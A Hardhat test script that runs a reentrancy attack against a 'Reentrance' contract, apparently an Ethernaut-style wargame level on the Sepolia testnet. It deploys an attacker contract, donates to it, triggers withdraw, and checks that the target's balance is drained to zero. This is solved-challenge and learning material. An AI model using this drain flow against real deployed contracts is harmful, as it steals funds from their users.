import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { BigNumber } from "ethers";
import { ethers } from "hardhat";
import { HackReentrance__factory, Reentrance__factory } from "../../typechain-types/factories/security/Reentrance.sol";
import { HackReentrance, Reentrance } from "../../typechain-types/security/Reentrance.sol";
import { createWallet, tx2contract } from "../sdk";
const hre = require('hardhat');

describe("Hack", function () {
  this.timeout(6000000);

  let signers : SignerWithAddress[]
  let owner: SignerWithAddress;
  let c : Reentrance
  let hc : HackReentrance

  before(async () => {
    signers = await ethers.getSigners()
    owner = signers[0];
    console.log("owner : ", owner.address)

  });

  let CONTRACT_ADDR = "0x1cCDEC5F37fa6e301d5e594E4A52AE59115Ebd1a"
  let AMOUNT = ethers.utils.parseEther("0.001")
  it("Deploy Contract", async function () {
		if (hre.hardhatArguments.network == undefined) {
      c = await new Reentrance__factory(owner).deploy({value : AMOUNT})
      console.log("c address : ", c.address)
      CONTRACT_ADDR = c.address
    } else {
      c = Reentrance__factory.connect(CONTRACT_ADDR, owner)
    }

    AMOUNT = (await owner.provider?.getBalance(CONTRACT_ADDR)) as BigNumber

  });

  it("Deploy HackContract", async function () {
    hc = await new HackReentrance__factory(owner).deploy(CONTRACT_ADDR, AMOUNT)
    console.log("hc address : ", hc.address)
    
    await (await c.donate(hc.address, {value : AMOUNT})).wait()
  });

  it("hack tx", async function () {
    let signer = owner

    async function tx() {
      
      const abi = [
        "function withdraw(uint) external"
      ]
    
      const TX_VALUE = ethers.utils.parseEther("0")
      const TX_GAS_LIMIT = BigInt(1000000)
      const reciept = await tx2contract(
        hc.address,
        abi,
        "withdraw",
        [AMOUNT],
        signer,
        TX_VALUE.toBigInt(),
        TX_GAS_LIMIT
      )
      console.log("reciept : ", reciept)
    }

    await tx()

		if (hre.hardhatArguments.network == undefined) {
      expect(await owner.provider?.getBalance(CONTRACT_ADDR)).eq(0)
    }
  });

});



// Test : yarn hardhat test test/security/*.ts --network sepolia